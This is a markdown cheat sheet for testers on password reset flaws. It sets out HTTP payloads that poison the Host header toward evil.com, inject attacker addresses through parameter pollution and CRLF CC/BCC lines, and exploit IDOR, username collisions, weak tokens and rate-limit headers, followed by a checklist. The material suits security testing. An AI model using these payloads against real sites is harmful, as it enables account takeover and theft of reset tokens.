---
tags:
  - high
  - logic
---

# Password Reset Vulnerabilities

Password reset flaws enable account takeover through token leakage, weak token generation, host header injection, and email parameter manipulation.

## Quick Test

```http
# Host header injection
POST /forgot-password HTTP/1.1
Host: evil.com

email=victim@target.com

# Email parameter pollution
email=victim@target.com&email=attacker@evil.com
```

## Attack Vectors

### Host Header Poisoning

Inject attacker domain to receive reset links:

```http
POST /forgot-password HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com

email=victim@target.com
```

**Header variations:**
```http
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Original-URL: https://evil.com
Forwarded: host=evil.com
Host: target.com:443@evil.com
Host: target.com#@evil.com
```

### Token Leakage via Referer

```
1. Reset link: https://target.com/reset?token=SECRET
2. Reset page loads external image/script
3. External request includes Referer header
4. Token leaked to third party
```

### Email Parameter Manipulation

```http
# Parameter pollution
email=victim@target.com&email=attacker@evil.com
email=victim@target.com%20attacker@evil.com
email=victim@target.com,attacker@evil.com

# CC/BCC injection
email=victim@target.com%0a%0dcc:attacker@evil.com
email=victim@target.com%0a%0dbcc:attacker@evil.com

# JSON array
{"email":["victim@target.com","attacker@evil.com"]}
```

### Weak Token Generation

**Predictable patterns:**
```
# Timestamp-based
token=1612345678000

# User ID + timestamp
token=base64(user_id + timestamp)

# MD5 of email
token=md5(email)

# Sequential
token=000001, 000002, 000003
```

**UUID v1 prediction:**
```bash
# Contains timestamp/MAC - use guidtool
python3 guidtool.py -t <uuid>
```

### Token Reuse / No Expiration

```
1. Request reset token
2. Use token to reset password
3. Try same token again → Still works?
4. Wait 24+ hours → Token still valid?
```

### Response Manipulation

```json
// Original response
{"success": false, "error": "Invalid token"}

// Modified response
{"success": true}
```

### IDOR in Reset Flow

```http
POST /reset-password HTTP/1.1

token=valid_token&user_id=VICTIM_ID&password=newpass
```

### Username Collision

```
1. Register as "admin " (trailing space)
2. Request password reset for "admin "
3. Token sent to your email
4. Token works for "admin" (trimmed)
```

### Token in Response

```http
POST /forgot-password HTTP/1.1

email=victim@target.com

HTTP/1.1 200 OK
{"status":"sent","resetToken":"abc123"}
```

## Bypasses

**Token format:**
```
# Case sensitivity
TOKEN=ABC123 vs token=abc123

# Encoding
token=%41%42%43

# Null byte
token=valid%00garbage
```

**Email normalization:**
```
VICTIM@TARGET.COM
victim+test@target.com
v.i.c.t.i.m@gmail.com
```

**Rate limit evasion:**
```http
X-Forwarded-For: random_ip
X-Real-IP: random_ip
```

## Real Examples

| Target | Technique | Impact |
|--------|-----------|--------|
| Sorare | Token digit manipulation | ATO |
| HackerOne #342693 | Facebook pixel Referer leak | Token theft |
| DoD | IDOR in password reset | Mass ATO |

## Tools

- **Burp Sequencer** — Token entropy analysis
- **guidtool** — UUID v1 prediction
- **Interactsh** — Detect token leakage
- **Turbo Intruder** — High-speed OTP brute force

## Checklist

- [ ] Test Host header injection
- [ ] Check for token in Referer (external resources)
- [ ] Try email parameter manipulation
- [ ] Analyze token entropy
- [ ] Test token expiration
- [ ] Test token reuse after password change
- [ ] Check if token bound to specific user
- [ ] Test rate limiting
- [ ] Look for IDOR in reset flow
- [ ] Check for token in API response
- [ ] Test username collision attacks
- [ ] Check if reset disables 2FA
